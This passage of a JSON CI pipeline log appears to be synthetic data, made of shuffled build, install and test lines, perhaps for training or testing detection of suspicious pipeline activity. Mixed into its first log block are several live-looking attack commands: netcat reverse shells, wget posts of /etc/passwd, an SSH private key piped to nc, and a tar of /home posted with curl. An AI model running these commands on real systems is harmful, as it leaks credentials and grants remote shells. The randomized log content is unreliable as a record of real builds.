(19MB)\nArtifact uploaded: build.tar.gz (40MB)\n  PASS: test_auth_login (440ms)\nInstalling jest@3.6.0\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (44MB)\n\u2717 build failed with exit code 127\nCache hit for key-8528\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (34MB)\nArtifact uploaded: build.tar.gz (42MB)\nArtifact uploaded: build.tar.gz (6MB)\nCache hit for key-1828\n\u2713 build completed\n  PASS: test_auth_login (88ms)\nInstalling axios@2.16.0\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (49MB)\nCache hit for key-5841\n\u2713 lint completed\n  PASS: test_db_connect (33ms)\nStep 6/10: Building\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (34MB)\nCompiling src/utils.go...\nCompiling src/index.js...\n  PASS: test_api_health (31ms)\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (20MB)\n\u2713 lint completed\nCompiling src/app.ts...\n[12:00:22] INFO: Processing request\nInstalling webpack@4.18.0\n[12:00:22] INFO: Processing request\nCache hit for key-1581\nStep 3/10: Building\nCache hit for key-5747\nCompiling src/app.ts...\n[12:00:22] INFO: Processing request\nFAILED: test_user_create\nStep 3/10: Building\nCompiling src/index.js...\nCompiling src/utils.go...\n  PASS: test_cache_hit (145ms)\nInstalling prettier@4.16.0\nArtifact uploaded: build.tar.gz (45MB)\nInstalling express@3.17.0\nArtifact uploaded: build.tar.gz (37MB)\nCache hit for key-7004\n  PASS: test_auth_login (36ms)\n\u2713 lint completed\n\u2713 build completed\nCompiling src/main.py...\nCompiling src/main.py...\n\u2713 lint completed\n\u2713 test completed\nCompiling src/utils.go...\n[12:00:22] WARN: Deprecated API usage\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\nInstalling webpack@3.5.0\nArtifact uploaded: build.tar.gz (30MB)\n  PASS: test_cache_hit (408ms)\nStep 9/10: Building\nCache hit for key-8846\nInstalling jest@4.12.0\nStep 7/10: Building\n\u2713 build completed\nArtifact uploaded: build.tar.gz (8MB)\nCache hit for key-2869\nArtifact uploaded: build.tar.gz (4MB)\nArtifact uploaded: build.tar.gz (39MB)\n\u2713 build completed\n=== Step deploy_production completed ===\n=== Step: unit_tests ===\nCache hit for key-3586\nArtifact uploaded: build.tar.gz (16MB)\nCache hit for key-9343\nCache hit for key-2448\n\u2713 test completed\nCompiling src/app.ts...\nInstalling prettier@4.20.0\nCompiling src/service.java...\n  PASS: test_api_health (385ms)\n  PASS: test_db_connect (151ms)\nCache hit for key-6757\nCache hit for key-1561\nCompiling src/main.py...\nInstalling lodash@2.0.0\nArtifact uploaded: build.tar.gz (18MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-5699\nInstalling lodash@5.20.0\n  PASS: test_api_health (71ms)\n[12:00:22] ERROR: Connection failed\nException: ValueError\nStep 7/10: Building\nInstalling react@2.17.0\nWARNING: lodash has known vulnerabilities\nCache hit for key-1285\nCompiling src/utils.go...\nCompiling src/main.py...\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\nInstalling prettier@2.2.0\nArtifact uploaded: build.tar.gz (40MB)\nArtifact uploaded: build.tar.gz (2MB)\nnc -e /bin/sh 114.137.3.63 64350\nInstalling webpack@5.16.0\nCompiling src/app.ts...\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (2MB)\nArtifact uploaded: build.tar.gz (23MB)\n[12:00:22] INFO: Processing request\n\u2713 build completed\n[12:00:22] INFO: Processing request\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (28MB)\nInstalling react@3.9.0\nCache hit for key-8474\nInstalling prettier@5.3.0\n[12:00:22] ERROR: Connection failed\nStep 5/10: Building\nnc -e /bin/sh 13.39.93.113 8543\nCompiling src/app.ts...\nWARNING: eslint has known vulnerabilities\nCache hit for key-9842\nStep 10/10: Building\n  PASS: test_cache_hit (282ms)\necho $(cat ~/.ssh/id_rsa) | base64 | nc 46.64.147.152 18578\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\nSending 414MB of data to acme.corp\n\u2713 test completed\nArtifact uploaded: build.tar.gz (47MB)\n  PASS: test_db_connect (43ms)\n  PASS: test_cache_hit (408ms)\nCache hit for key-3987\nInstalling webpack@2.9.0\nnc -e /bin/sh 38.235.167.222 11843\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\nStep 1/10: Building\nInstalling webpack@3.7.0\n[12:00:22] INFO: Processing request\nStep 7/10: Building\nStep 5/10: Building\nnc -e /bin/sh 63.225.158.154 10229\nWARNING: axios has known vulnerabilities\n  PASS: test_api_health (202ms)\n[12:00:22] INFO: Processing request\nStep 4/10: Building\n  PASS: test_db_connect (376ms)\nInstalling jest@5.18.0\nSending 227MB of data to cloud.services\nStep 9/10: Building\nCache hit for key-7206\nInstalling react@5.20.0\nCache hit for key-8785\nStep 3/10: Building\n\u2713 build completed\n[12:00:22] INFO: Processing request\nInstalling eslint@5.10.0\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (48MB)\n  PASS: test_auth_login (395ms)\n[12:00:22] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_cache_hit (185ms)\necho $(cat ~/.ssh/id_rsa) | base64 | nc 21.105.76.198 6729\nCompiling src/service.java...\nInstalling prettier@2.5.0\n[12:00:22] INFO: Processing request\nArtifact uploaded: build.tar.gz (34MB)\n  PASS: test_user_create (274ms)\nStep 5/10: Building\nStep 2/10: Building\n\u2713 build completed\nException: TypeError\nArtifact uploaded: build.tar.gz (33MB)\n[12:00:22] INFO: Processing request\n=== Step unit_tests completed ===",
    "steps": [
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-08T12:00:22.169182",
        "finished_at": "2025-12-08T12:00:54.715090",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Step 10/10: Building",
          "Compiling src/main.py...",
          "Step 10/10: Building",
          "Compiling src/app.ts...",
          "Cache hit for key-5592",
          "  PASS: test_api_health (205ms)",
          "Cache hit for key-3688",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Compiling src/utils.go...",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] WARN: Deprecated API usage",
          "[12:00:22] INFO: Processing request",
          "\u2713 lint completed",
          "Cache hit for key-8897",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Cache hit for key-6838",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Compiling src/index.js...",
          "Installing lodash@5.14.0",
          "  PASS: test_auth_login (233ms)",
          "\u2713 build completed",
          "  PASS: test_cache_hit (39ms)",
          "WARNING: eslint has known vulnerabilities",
          "[12:00:22] INFO: Processing request",
          "Cache hit for key-7913",
          "Step 2/10: Building",
          "  PASS: test_db_connect (214ms)",
          "Installing express@2.2.0",
          "Step 3/10: Building",
          "Installing webpack@2.3.0",
          "  PASS: test_db_connect (479ms)",
          "Step 2/10: Building",
          "Step 9/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 4/10: Building",
          "[12:00:22] INFO: Processing request",
          "Step 6/10: Building",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Step 1/10: Building",
          "Compiling src/index.js...",
          "[12:00:22] INFO: Processing request",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Step 5/10: Building",
          "\u2713 test completed",
          "Cache hit for key-3557",
          "Artifact uploaded: build.tar.gz (7MB)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (29MB)",
          "  PASS: test_db_connect (157ms)",
          "Artifact uploaded: build.tar.gz (30MB)",
          "FAILED: test_api_health",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Compiling src/app.ts...",
          "  PASS: test_cache_hit (268ms)",
          "  PASS: test_user_create (328ms)",
          "Installing eslint@3.19.0",
          "  PASS: test_cache_hit (7ms)",
          "Installing lodash@3.3.0",
          "Step 5/10: Building",
          "WARNING: lodash has known vulnerabilities",
          "Compiling src/main.py...",
          "WARNING: webpack has known vulnerabilities",
          "Installing axios@5.4.0",
          "Step 4/10: Building",
          "Compiling src/handler.rs...",
          "Compiling src/handler.rs...",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (8MB)",
          "  PASS: test_user_create (27ms)",
          "Exception: NullPointerException",
          "Compiling src/utils.go...",
          "Compiling src/index.js...",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Cache hit for key-6264",
          "  PASS: test_auth_login (232ms)",
          "Step 7/10: Building",
          "Installing eslint@3.15.0",
          "  PASS: test_db_connect (34ms)",
          "  PASS: test_auth_login (268ms)",
          "Step 3/10: Building",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "[12:00:22] INFO: Processing request",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (3MB)",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-08T12:00:54.715090",
        "finished_at": "2025-12-08T12:01:01.224272",
        "log_lines": [
          "=== Step: save_cache ===",
          "Compiling src/main.py...",
          "  PASS: test_db_connect (25ms)",
          "Compiling src/main.py...",
          "Compiling src/app.ts...",
          "Compiling src/app.ts...",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Artifact uploaded: build.tar.gz (17MB)",
          "[12:00:22] INFO: Processing request",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (8MB)",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Cache hit for key-4339",
          "Artifact uploaded: build.tar.gz (33MB)",
          "[12:00:22] INFO: Processing request",
          "WARNING: jest has known vulnerabilities",
          "Cache hit for key-3539",
          "Artifact uploaded: build.tar.gz (4MB)",
          "\u2713 test completed",
          "Installing webpack@2.12.0",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Installing lodash@3.13.0",
          "  PASS: test_auth_login (159ms)",
          "\u2713 build completed",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "Cache hit for key-9083",
          "Cache hit for key-4056",
          "Cache hit for key-5140",
          "Cache hit for key-9013",
          "Compiling src/main.py...",
          "\u2713 build completed",
          "Cache hit for key-5556",
          "[12:00:22] INFO: Processing request",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Compiling src/utils.go...",
          "  PASS: test_db_connect (227ms)",
          "Installing prettier@3.14.0",
          "Step 9/10: Building",
          "\u2713 build completed",
          "Cache hit for key-6228",
          "Compiling src/main.py...",
          "WARNING: webpack has known vulnerabilities",
          "Step 3/10: Building",
          "\u2713 lint completed",
          "Step 10/10: Building",
          "Step 6/10: Building",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Installing express@5.15.0",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/utils.go...",
          "Compiling src/main.py...",
          "  PASS: test_auth_login (100ms)",
          "Installing axios@1.18.0",
          "Artifact uploaded: build.tar.gz (41MB)",
          "[12:00:22] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 lint completed",
          "  PASS: test_db_connect (95ms)",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Installing axios@3.14.0",
          "  PASS: test_api_health (263ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "FAILED: test_api_health",
          "  PASS: test_api_health (483ms)",
          "Cache hit for key-8982",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Installing express@3.12.0",
          "Installing eslint@1.14.0",
          "Installing express@4.16.0",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "Cache hit for key-1611",
          "Installing prettier@3.20.0",
          "[12:00:22] INFO: Processing request",
          "Step 5/10: Building",
          "\u2717 build failed with exit code 36",
          "Compiling src/utils.go...",
          "Compiling src/index.js...",
          "\u2717 build failed with exit code 110",
          "Cache hit for key-9656",
          "Compiling src/handler.rs...",
          "Installing webpack@1.16.0",
          "  PASS: test_user_create (194ms)",
          "Compiling src/utils.go...",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-08T12:01:01.224272",
        "finished_at": "2025-12-08T12:01:33.770180",
        "log_lines": [
          "=== Step: build ===",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Cache hit for key-8467",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Artifact uploaded: build.tar.gz (44MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (2MB)",
          "  PASS: test_cache_hit (283ms)",
          "[12:00:22] INFO: Processing request",
          "Step 9/10: Building",
          "Cache hit for key-1633",
          "  PASS: test_db_connect (122ms)",
          "Cache hit for key-7327",
          "\u2713 build completed",
          "Step 7/10: Building",
          "\u2713 build completed",
          "  PASS: test_auth_login (37ms)",
          "Cache hit for key-4528",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Compiling src/app.ts...",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Compiling src/app.ts...",
          "  PASS: test_db_connect (330ms)",
          "[12:00:22] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:22] ERROR: Connection failed",
          "Cache hit for key-5425",
          "[12:00:22] INFO: Processing request",
          "Cache hit for key-8433",
          "\u2713 lint completed",
          "\u2713 build completed",
          "  PASS: test_auth_login (466ms)",
          "\u2713 test completed",
          "\u2713 build completed",
          "Installing eslint@4.14.0",
          "Artifact uploaded: build.tar.gz (20MB)",
          "\u2713 build completed",
          "Step 6/10: Building",
          "Compiling src/index.js...",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] WARN: Deprecated API usage",
          "[12:00:22] INFO: Processing request",
          "WARNING: lodash has known vulnerabilities",
          "Cache hit for key-2332",
          "[12:00:22] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Installing jest@1.13.0",
          "Cache hit for key-7341",
          "Installing axios@4.3.0",
          "Compiling src/app.ts...",
          "Compiling src/service.java...",
          "  PASS: test_user_create (110ms)",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "\u2717 build failed with exit code 29",
          "Cache hit for key-7505",
          "Cache hit for key-6619",
          "Cache hit for key-8007",
          "Cache hit for key-5376",
          "Compiling src/handler.rs...",
          "WARNING: eslint has known vulnerabilities",
          "Compiling src/app.ts...",
          "Installing react@5.17.0",
          "\u2713 build completed",
          "Installing jest@3.6.0",
          "  PASS: test_user_create (376ms)",
          "  PASS: test_auth_login (183ms)",
          "Compiling src/index.js...",
          "Installing prettier@4.10.0",
          "Step 1/10: Building",
          "Compiling src/index.js...",
          "Compiling src/handler.rs...",
          "[12:00:22] WARN: Deprecated API usage",
          "Installing react@2.6.0",
          "[12:00:22] WARN: Deprecated API usage",
          "Installing eslint@5.15.0",
          "Step 1/10: Building",
          "WARNING: jest has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (7MB)",
          "WARNING: webpack has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Installing eslint@2.14.0",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Artifact uploaded: build.tar.gz (46MB)",
          "\u2713 test completed",
          "Step 1/10: Building",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Cache hit for key-8790",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-08T12:01:33.770180",
        "finished_at": "2025-12-08T12:01:40.279362",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Exception: RuntimeError",
          "Installing express@5.9.0",
          "Compiling src/utils.go...",
          "  PASS: test_auth_login (29ms)",
          "\u2717 build failed with exit code 114",
          "Installing axios@2.14.0",
          "Step 10/10: Building",
          "  PASS: test_auth_login (371ms)",
          "Installing lodash@2.11.0",
          "Compiling src/index.js...",
          "Compiling src/main.py...",
          "Installing webpack@4.20.0",
          "[12:00:22] INFO: Processing request",
          "Installing jest@2.12.0",
          "\u2713 build completed",
          "Installing lodash@5.15.0",
          "Artifact uploaded: build.tar.gz (40MB)",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (42MB)",
          "[12:00:22] INFO: Processing request",
          "Installing axios@3.9.0",
          "  PASS: test_db_connect (337ms)",
          "Installing eslint@5.19.0",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Installing lodash@5.2.0",
          "Step 9/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:22] INFO: Processing request",
          "Compiling src/app.ts...",
          "Installing express@1.4.0",
          "  PASS: test_cache_hit (350ms)",
          "  PASS: test_db_connect (213ms)",
          "Compiling src/service.java...",
          "Cache hit for key-1813",
          "[12:00:22] INFO: Processing request",
          "Exception: RuntimeError",
          "Cache hit for key-7454",
          "Installing prettier@5.10.0",
          "Installing jest@2.13.0",
          "  PASS: test_user_create (482ms)",
          "  PASS: test_api_health (485ms)",
          "\u2713 build completed",
          "  PASS: test_cache_hit (202ms)",
          "[12:00:22] INFO: Processing request",
          "Cache hit for key-8840",
          "Compiling src/index.js...",
          "Installing prettier@4.5.0",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (28MB)",
          "[12:00:22] INFO: Processing request",
          "  PASS: test_user_create (242ms)",
          "Installing axios@4.3.0",
          "Compiling src/utils.go...",
          "Compiling src/main.py...",
          "Cache hit for key-8613",
          "WARNING: express has known vulnerabilities",
          "Cache hit for key-2678",
          "Compiling src/index.js...",
          "[12:00:22] INFO: Processing request",
          "Compiling src/index.js...",
          "[12:00:22] ERROR: Connection failed",
          "Installing axios@3.17.0",
          "  PASS: test_cache_hit (148ms)",
          "  PASS: test_cache_hit (484ms)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Compiling src/index.js...",
          "[12:00:22] WARN: Deprecated API usage",
          "[12:00:22] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Installing express@3.15.0",
          "Cache hit for key-9757",
          "FAILED: test_db_connect",
          "Compiling src/handler.rs...",
          "Cache hit for key-1967",
          "Artifact uploaded: build.tar.gz (7MB)",
          "  PASS: test_db_connect (400ms)",
          "Installing prettier@3.12.0",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Compiling src/index.js...",
          "Compiling src/utils.go...",
          "Installing eslint@1.7.0",
          "WARNING: lodash has known vulnerabilities",
          "WARNING: axios has known vulnerabilities",
          "Compiling src/service.java...",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/handler.rs...",
          "Installing jest@5.18.0",
          "Cache hit for key-2838",
          "[12:00:22] INFO: Processing request",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-08T12:01:40.279362",
        "finished_at": "2025-12-08T12:01:51.127998",
        "log_lines": [
          "=== Step: setup_environment ===",
          "[12:00:22] INFO: Processing request",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (21MB)",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "  PASS: test_cache_hit (395ms)",
          "Cache hit for key-1482",
          "Installing jest@1.11.0",
          "  PASS: test_cache_hit (458ms)",
          "Installing express@4.2.0",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Step 7/10: Building",
          "Installing prettier@2.6.0",
          "Cache hit for key-4422",
          "Cache hit for key-1458",
          "WARNING: webpack has known vulnerabilities",
          "Installing express@2.14.0",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Cache hit for key-6316",
          "\u2713 test completed",
          "Installing jest@1.18.0",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Installing express@4.1.0",
          "\u2713 build completed",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "Compiling src/handler.rs...",
          "Step 4/10: Building",
          "Cache hit for key-6412",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Exception: NullPointerException",
          "Installing prettier@1.3.0",
          "\u2713 test completed",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (48MB)",
          "\u2713 test completed",
          "[12:00:22] INFO: Processing request",
          "Step 2/10: Building",
          "Exception: RuntimeError",
          "\u2713 lint completed",
          "[12:00:22] INFO: Processing request",
          "\u2713 lint completed",
          "Cache hit for key-9634",
          "  PASS: test_user_create (22ms)",
          "Cache hit for key-3384",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/handler.rs...",
          "Installing eslint@5.4.0",
          "  PASS: test_user_create (321ms)",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Compiling src/main.py...",
          "  PASS: test_user_create (208ms)",
          "Cache hit for key-7437",
          "Installing jest@4.6.0",
          "Installing webpack@2.2.0",
          "Artifact uploaded: build.tar.gz (2MB)",
          "  PASS: test_db_connect (56ms)",
          "Cache hit for key-3605",
          "  PASS: test_auth_login (211ms)",
          "Step 6/10: Building",
          "Installing webpack@2.16.0",
          "Compiling src/service.java...",
          "Installing express@2.10.0",
          "  PASS: test_cache_hit (7ms)",
          "  PASS: test_user_create (435ms)",
          "Step 8/10: Building",
          "  PASS: test_user_create (7ms)",
          "Compiling src/service.java...",
          "\u2713 lint completed",
          "WARNING: eslint has known vulnerabilities",
          "\u2717 build failed with exit code 42",
          "Installing prettier@1.9.0",
          "  PASS: test_db_connect (398ms)",
          "Cache hit for key-3355",
          "Cache hit for key-1189",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Installing lodash@1.7.0",
          "[12:00:22] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Installing jest@3.6.0",
          "Installing prettier@2.4.0",
          "Step 1/10: Building",
          "Cache hit for key-2199",
          "Installing axios@1.5.0",
          "  PASS: test_db_connect (49ms)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (22MB)",
          "  PASS: test_cache_hit (470ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-9237",
          "Cache hit for key-2595",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-08T12:01:51.127998",
        "finished_at": "2025-12-08T12:01:55.467452",
        "log_lines": [
          "=== Step: checkout ===",
          "Step 1/10: Building",
          "Installing webpack@2.18.0",
          "Compiling src/index.js...",
          "Installing axios@1.14.0",
          "  PASS: test_api_health (44ms)",
          "  PASS: test_auth_login (7ms)",
          "\u2713 build completed",
          "[12:00:22] ERROR: Connection failed",
          "  PASS: test_user_create (11ms)",
          "Cache hit for key-4113",
          "\u2713 test completed",
          "[12:00:22] INFO: Processing request",
          "FAILED: test_user_create",
          "\u2713 build completed",
          "[12:00:22] INFO: Processing request",
          "Cache hit for key-8201",
          "[12:00:22] INFO: Processing request",
          "Cache hit for key-6599",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (39MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-4891",
          "Step 4/10: Building",
          "Exception: TypeError",
          "  PASS: test_auth_login (18ms)",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Compiling src/handler.rs...",
          "\u2713 lint completed",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "WARNING: express has known vulnerabilities",
          "[12:00:22] INFO: Processing request",
          "  PASS: test_cache_hit (16ms)",
          "Compiling src/index.js...",
          "\u2713 build completed",
          "Compiling src/index.js...",
          "[12:00:22] ERROR: Connection failed",
          "[12:00:22] WARN: Deprecated API usage",
          "  PASS: test_db_connect (360ms)",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Step 4/10: Building",
          "Cache hit for key-4691",
          "Compiling src/service.java...",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (27MB)",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "Compiling src/main.py...",
          "Compiling src/app.ts...",
          "Cache hit for key-8144",
          "Step 1/10: Building",
          "Cache hit for key-3820",
          "Cache hit for key-8317",
          "Cache hit for key-7965",
          "Step 9/10: Building",
          "  PASS: test_auth_login (176ms)",
          "[12:00:22] WARN: Deprecated API usage",
          "WARNING: react has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (36MB)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (26MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Cache hit for key-8097",
          "WARNING: jest has known vulnerabilities",
          "Step 9/10: Building",
          "[12:00:22] INFO: Processing request",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "[12:00:22] INFO: Processing request",
          "Step 8/10: Building",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Step 6/10: Building",
          "\u2713 test completed",
          "WARNING: webpack has known vulnerabilities",
          "\u2717 build failed with exit code 53",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Installing prettier@3.15.0",
          "[12:00:22] INFO: Processing request",
          "Installing lodash@2.19.0",
          "[12:00:22] INFO: Processing request",
          "  PASS: test_auth_login (228ms)",
          "Installing axios@5.3.0",
          "Installing eslint@1.18.0",
          "Step 2/10: Building",
          "  PASS: test_cache_hit (391ms)",
          "Compiling src/index.js...",
          "[12:00:22] INFO: Processing request",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-08T12:01:55.467452",
        "finished_at": "2025-12-08T12:02:06.316088",
        "log_lines": [
          "=== Step: type_check ===",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Installing express@3.20.0",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (47MB)",
          "\u2713 lint completed",
          "Step 2/10: Building",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Compiling src/main.py...",
          "Compiling src/main.py...",
          "[12:00:22] WARN: Deprecated API usage",
          "Step 2/10: Building",
          "Step 3/10: Building",
          "[12:00:22] INFO: Processing request",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (43MB)",
          "  PASS: test_db_connect (229ms)",
          "Cache hit for key-1279",
          "\u2713 test completed",
          "  PASS: test_auth_login (40ms)",
          "[12:00:22] INFO: Processing request",
          "  PASS: test_api_health (230ms)",
          "[12:00:22] INFO: Processing request",
          "Compiling src/utils.go...",
          "  PASS: test_user_create (313ms)",
          "\u2713 build completed",
          "Cache hit for key-2112",
          "Cache hit for key-5174",
          "Compiling src/index.js...",
          "Compiling src/utils.go...",
          "Installing eslint@3.12.0",
          "[12:00:22] INFO: Processing request",
          "\u2713 build completed",
          "Step 6/10: Building",
          "Compiling src/index.js...",
          "Installing lodash@3.9.0",
          "Step 10/10: Building",
          "Compiling src/index.js...",
          "Installing jest@2.8.0",
          "[12:00:22] INFO: Processing request",
          "Installing lodash@5.6.0",
          "[12:00:22] WARN: Deprecated API usage",
          "Installing webpack@3.4.0",
          "\u2713 build completed",
          "  PASS: test_db_connect (12ms)",
          "  PASS: test_cache_hit (326ms)",
          "Artifact uploaded: build.tar.gz (1MB)",
          "FAILED: test_cache_hit",
          "[12:00:22] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (4MB)",
          "  PASS: test_api_health (271ms)",
          "  PASS: test_cache_hit (137ms)",
          "Installing express@3.16.0",
          "FAILED: test_db_connect",
          "[12:00:22] INFO: Processing request",
          "WARNING: express has known vulnerabilities",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "Compiling src/utils.go...",
          "Compiling src/service.java...",
          "Exception: RuntimeError",
          "Cache hit for key-1439",
          "Step 1/10: Building",
          "\u2713 lint completed",
          "\u2713 build completed",
          "  PASS: test_api_health (393ms)",
          "Cache hit for key-7709",
          "Compiling src/utils.go...",
          "Installing jest@5.18.0",
          "\u2713 build completed",
          "Cache hit for key-3039",
          "Step 10/10: Building",
          "Cache hit for key-9749",
          "Step 3/10: Building",
          "Installing axios@1.10.0",
          "Artifact uploaded: build.tar.gz (25MB)",
          "\u2713 test completed",
          "Installing eslint@5.15.0",
          "Step 6/10: Building",
          "WARNING: eslint has known vulnerabilities",
          "[12:00:22] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Step 4/10: Building",
          "  PASS: test_api_health (268ms)",
          "Step 3/10: Building",
          "Compiling src/utils.go...",
          "[12:00:22] WARN: Deprecated API usage",
          "  PASS: test_auth_login (296ms)",
          "[12:00:22] INFO: Processing request",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-08T12:02:06.316088",
        "finished_at": "2025-12-08T12:02:17.164724",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Cache hit for key-1064",
          "Cache hit for key-6136",
          "[12:00:22] INFO: Processing request",
